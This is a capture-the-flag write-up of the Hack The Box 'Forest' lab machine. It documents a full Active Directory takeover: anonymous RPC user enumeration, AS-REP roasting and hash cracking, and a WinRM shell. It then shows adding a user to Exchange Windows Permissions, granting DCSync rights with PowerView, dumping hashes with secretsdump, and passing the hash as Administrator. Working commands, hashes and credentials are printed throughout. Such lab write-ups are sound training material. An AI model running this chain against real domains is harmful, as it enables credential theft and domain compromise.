---
layout: post
title: "Forest"
date: 2021-07-21
categories: [HTB, machine-easy-htb]
image: /assets/img/HTB/easy/Forest/Forest.png
---
> Forest Machine involve dumping usernames of account via msrpc and by checking for Asreproasting for any account and found one of account has it and with cracking of hashes of that account and got password of that account and it is service account. By enumerate groups in which it involved nested groups of service account, i found that i am in group of Account operators and with it and more into bloodhound enumeration, i have genericall Acl permission on Exchange windows permission in which i add myself into that group and once you are into that group, you have writeAcl permission on HTB.local(Our NAME) in which i will give myself right of DCSync in which i will dump hashes of Domain controllers.With hashes, i perform pass the hash of htb.local/Administrator and login as Administrator

# Enumeration
- Starting by scanning for ports

```
mkdir -p nmaps && rustscan -a $IP --ulimit 5000 -- -vvv -Pn -sC -sV -oN nmaps/nmap_rustscansimple.txt
```

```
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-04-25 11:48:41Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42369/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29553/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44587/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m27s, deviation: 4h02m30s, median: 6m27s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-04-25T04:49:35-07:00
| smb2-time: 
|   date: 2023-04-25T11:49:39
|_  start_date: 2023-04-25T11:46:12

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 25 14:43:34 2023 -- 1 IP address (1 host up) scanned in 89.74 seconds
```
From above result, i can tell that I am dealing with Active Directory as port 88 is open

# SMB ENUMERATION
- Let start by know netbios name of this windows and as seen from nmap, it is domain controller

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ crackmapexec smb $IP                                                      
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```
- From above, i know that netbios name is FOREST and domain is active.htb
- since this is domain, let enumerate domain and if it fail then i will check for CVEs based on this service or other services
- let check for anonymous

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ smbclient -L \\\\10.10.10.161\\
Password for [WORKGROUP\blackninja]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- I can login as Anonymous but dont have any share

# MSRPC ENUMERATION
- Let start by check anonymous

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> 
```
- From above, you can see that i was able to login as Anonymous user
- In rpcclient, there is command called enumdomusers in which it dump users if it is allowed for that user to be list users
- let check for this user that i have

```
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[a] rid:[0x2582]
rpcclient $> 
```
- As you can see from above that i can dump user from domain controllers
- let save them to file and format clearly

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ nano users_from_rpc.txt
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ cat users_from_rpc.txt|head                                                           
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ cat users_from_rpc.txt|awk -F "[" '{print $2}'|awk -F ']' '{print $1}' > users.txt
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ cat users.txt|head
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
```
- Since i have users, i can start by check if any user was disable kerberos preauthentication and i will use tool called impacket-GetNPUsers

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ impacket-GetNPUsers htb.local/ -no-pass -dc-ip 10.10.10.161 -format hashcat -outputfile hashes.asreproast -usersfile users.txt                  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ cat hashes.asreproast  
$krb5asrep$23$svc-alfresco@HTB.LOCAL:80284117946be00139cb15bc99bb0fe2$0241c6852056f178cc01f8a1a1c8cd4a417f0fbd5bae6988829cd0ec79e340a4a738eb087fc6cb50deff3c91523f3ed8b72569cc29087ca7b470801a6b7367d4e8c0c53a3660feedc820442bb4f4c57fc6878f1d9753330671701ada61641cc395d0c77a4bc170c76e67ea7ab8751a08ca4e7a9c426dedfe272408afd603ada33c10146eef0ff930eb45182fa1b4345dc580d85b0f1eaee299c6010d3a877741573dd0dbf1f0f6cb4f3cc4d10ed2abc7612dae498af0c2a2a547db0f8549f0477a7592b2e61d81f52dec532b906239dd3ad43cd88bf750d2b2130b6b3d7f35ca6826b74016bd
```
- Since i have ntmlv2 hash for user called svc-alfresco and then i will crack it offline in my computer

```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```
-Output

```
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:4103d27df75a0c65094ac1a648a1b81f$61b4bf2ada9184ef1524efbf2898e78ab3c0d3ce6e7eed223096c0a0c4b2fe091785e14dba7a85c5967e782e9a440d39fa6cddac43d6fc2d0c039daea7ddd225bf0321edb4379f4b539e1384eeb32ee89c0183e084c5e925728323d36a7f9be488d197f2a869ae2be95a2b21c5e65656e50ab0db7d55a551b43a9a4cde5d2140c331309cb766dfd525ef98bb5236790d380555a8a5784cc507856ab19562af71d21ccea40d611cd11edee65e94b571cf4450c8ee4a5683523c765f0b00ab5cff4ea202d70f4b1a45ffefadc3cca3ee7fabdaa16b9dce48c97c2bf4ae8111714e12a381bb5ed1:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:4103d27df75a0c...bb5ed1
Time.Started.....: Tue Apr 25 15:07:20 2023 (1 sec)
Time.Estimated...: Tue Apr 25 15:07:21 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4300.9 kH/s (1.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

- Since i have credentials for user svc-alfresco then i will try to check wherethere i can login and get shell by using tool called crackmapexec

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ crackmapexec smb $IP -u 'svc-alfresco' -p 's3rvice'                
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ crackmapexec winrm $IP -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ crackmapexec ldap $IP -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
LDAP        10.10.10.161    445    FOREST           [-] htb.local\svc-alfresco:s3rvice Error connecting to the domain, are you sure LDAP service is running on the target ?

```

- From above, you can see that i can login with winrm in which it mean that i can use tool like evil-winrm to login in
- Let enumerate shares before login with winrm

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ crackmapexec smb $IP -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
```
- let check those share with smbclient

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ smbclient -L \\\\10.10.10.161\\NETLOGON -U 'svc-alfresco%s3rvice'     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ smbclient \\\\10.10.10.161\\NETLOGON -U 'svc-alfresco%s3rvice' 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep 18 20:45:49 2019
  ..                                  D        0  Wed Sep 18 20:45:49 2019

                5069055 blocks of size 4096. 2549457 blocks available
smb: \> exit
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest]
└─$ smbclient \\\\10.10.10.161\\SYSVOL -U 'svc-alfresco%s3rvice'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep 18 20:45:49 2019
  ..                                  D        0  Wed Sep 18 20:45:49 2019
  htb.local                          Dr        0  Wed Sep 18 20:45:49 2019

                5069055 blocks of size 4096. 2549457 blocks available
smb: \> cd htb.local
smb: \htb.local\> dir
  .                                   D        0  Wed Sep 18 13:58:53 2019
  ..                                  D        0  Wed Sep 18 13:58:53 2019
  DfsrPrivate                      DHSr        0  Wed Sep 18 13:58:53 2019
  Policies                            D        0  Wed Sep 18 20:45:57 2019
  scripts                             D        0  Wed Sep 18 20:45:49 2019

```

- let download shares and analysis for passwords especially after found it in my first box [Active-HTB](https://blackninja23.github.io/Active-HTB/) in which it was CVE-2014-1812(MS14-025)

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest/shares]
└─$ smbclient \\\\10.10.10.161\\NETLOGON -U 'svc-alfresco'%'s3rvice' -c 'prompt;recurse;mget *'
                                                                                                             
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest/shares]
└─$ ls -a
.  ..
                                                                                                             
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest/shares]
└─$ smbclient \\\\10.10.10.161\\SYSVOL -U 'svc-alfresco'%'s3rvice' -c 'prompt;recurse;mget *'
NT_STATUS_ACCESS_DENIED listing \htb.local\DfsrPrivate\*
getting file \htb.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \htb.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \htb.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.7 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \htb.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3834 as htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.6 KiloBytes/sec) (average 0.8 KiloBytes/sec)
                                                                                                                                                                                                                                        
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest/shares]
└─$ 
```
- After somewhile, there is no CVE-2014-1812(MS14-025)  in this share called SYSVOL and nothing interesting
- Since i can login, let login

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Forest/shares]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p "s3rvice"     

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/25/2023   4:46 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
5298ea3ec17f98803cea32747709062f
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 

```

- Since this is domain controllers, i wont rush into any fancy windows exploitaion at this moment
- Insteady i would enumerate other users in the domain by using bloodhound

# KERBEROS ENUMERATION
- At first writeup of [Active Hackthebox](https://blackninja23.github.io/Active-HTB/), i was using bloodhound-python but for this Forest hackthebox, i will use [Sharphound](https://github.com/BloodHoundAD/SharpHound/releases). At this moment, i will use [Sharphound v1.1.0](https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.0) in which in description say that is use BloodHound 4.2
- Make sure version of bloodhound is same as what Sharphound release support at that time and if you want download, kindly check [Active Hackthebox](https://blackninja23.github.io/Active-HTB/) writeup
- I will start smbserver from my local computer

```
impacket-smbserver Q . -smb2support
```
- let dump data from kerberos use SharpHound.exe after transfer it from local computer

```
copy \\10.10.14.81\\Q\\SharpHound.exe .
.\SharpHound.exe --CollectionMethods All
```
- Output

```
*Evil-WinRM* PS C:\windows\tasks> dir
*Evil-WinRM* PS C:\windows\tasks> copy \\10.10.14.81\\Q\\SharpHound.exe .
*Evil-WinRM* PS C:\windows\tasks> dir


    Directory: C:\windows\tasks


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/3/2022   6:20 AM        1051648 SharpHound.exe


*Evil-WinRM* PS C:\windows\tasks> .\SharpHound.exe --CollectionMethods All
2023-04-26T02:07:36.0580825-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-04-26T02:07:36.4330428-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-04-26T02:07:36.4799029-07:00|INFORMATION|Initializing SharpHound at 2:07 AM on 4/26/2023
2023-04-26T02:07:37.2317629-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-04-26T02:07:37.7630138-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-04-26T02:07:37.9977497-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-04-26T02:07:38.0133697-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-04-26T02:08:08.0665318-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
2023-04-26T02:08:23.1167404-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-04-26T02:08:23.1636152-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-04-26T02:08:23.2573745-07:00|INFORMATION|Status: 161 objects finished (+161 3.577778)/s -- Using 49 MB RAM
2023-04-26T02:08:23.2573745-07:00|INFORMATION|Enumeration finished in 00:00:45.5018113
2023-04-26T02:08:23.3511592-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-04-26T02:08:23.3667472-07:00|INFORMATION|SharpHound Enumeration Completed at 2:08 AM on 4/26/2023! Happy Graphing!
*Evil-WinRM* PS C:\windows\tasks> dir


    Directory: C:\windows\tasks


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/26/2023   2:08 AM          19068 20230426020822_BloodHound.zip
-a----        4/26/2023   2:08 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         8/3/2022   6:20 AM        1051648 SharpHound.exe


*Evil-WinRM* PS C:\windows\tasks> 
```
- I will transfer that zip file of bloodhounnd from victim box to my local computer
- Command

```
copy 20230426020822_BloodHound.zip \\10.10.14.81\\Q\\
```

- Verify in your computer that file has been transfered successful by checking folder in which smbserver was started
- with data that i have, i will open it with bloodhound

```
sudo neo4j console
```

- In another terminal,

```
bloodhound
```

- Then import data to bloodhound and start analysis
- The following below will take through upload and analysis

[![Forest Upload Data to bloodhound](/assets/img/HTB/easy/Forest/VF.png)](https://youtu.be/t3HOsqy2wqE)

- Checking Shortest path from owned principal in sAnalysis ,You will see the following

![](/assets/img/HTB/easy/Forest/ownedprincipals.png)
- The above picture indicate i am member of Account Operators via nested group of service accounts in which has genericall on EXCH01.HTB.LOCAL
- but first what does Account Operators do?if you check in [microsoft official page](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) about Account Operators and it say that ``Members of the Account Operators group can't manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can't modify user rights.`` in which for us an attacker , it mean that other group i have control over them
- let check how many group do we have

![](/assets/img/HTB/easy/Forest/dbinfo.png)
- i check shortest path from high value target, you can check the video as it show but the summarize pic is

![](/assets/img/HTB/easy/Forest/ADenum.png)
- Before i continue, you need to check [hacktricks on Access Control Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
- Since i am member of Account Operators and look at above pic, you can see GenericAll in which from hacktricks and it say that i have full control over it in which it mean that i have full control over enterprise key admins and exchange windows permissions but from [microsoft official page](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) about Account Operators and it say that ``Members of the Account Operators group can't manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can't modify user rights.`` in which maybe i should start with exchange windows permissions as this doesnot seems to be administrators
- let me start with exchange windows permissions

```
net user blackninja pass123@ /add
net group "exchange windows permissions" blackninja /add /domain
```
- let me try for enterprise key admins

```
net group "enterprise key admins" blackninja /add /domain
```

![](/assets/img/HTB/easy/Forest/user.png)

![](/assets/img/HTB/easy/Forest/netuser.png)
- now that i am in group of exchange windows permissions, i have another abuse which is writeDaCl to HTB.LOCAL and for other group called "enterprise key admins", i have another abuse which is AddkeyCredentialLink to FOREST.Htb.local
- let check in bloodhound on how to exploit this

![](/assets/img/HTB/easy/Forest/dacl.png)
- On bloodhound, it say to use powerview in which i will use [powerview from dev branch](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) as it is most recommended
- After sometime on troubleshoting on commands as last command of Add-DomainObjectAcl doesnot seems to work
- The following command below works

```
import-module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'pass123@' -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential('HTB\blackninja', $SecPassword);
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity blackninja -Rights DCSync;
```

![](/assets/img/HTB/easy/Forest/dcsync.png)
- i try to login as user blackninja but it fails
- from documentation in bloodhound, it say we can use mimikatz to dump hashes 
- Alternative, let use secretdump to dump hashes as i cant login

```
impacket-secretsdump htb.local/blackninja:"pass123@"@10.10.10.161
```

![](/assets/img/HTB/easy/Forest/secretdump.png)
- let try login as Administrator with pass the hash

```
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

![](/assets/img/HTB/easy/Forest/root.png)
![](/assets/img/HTB/easy/Forest/finish.png)
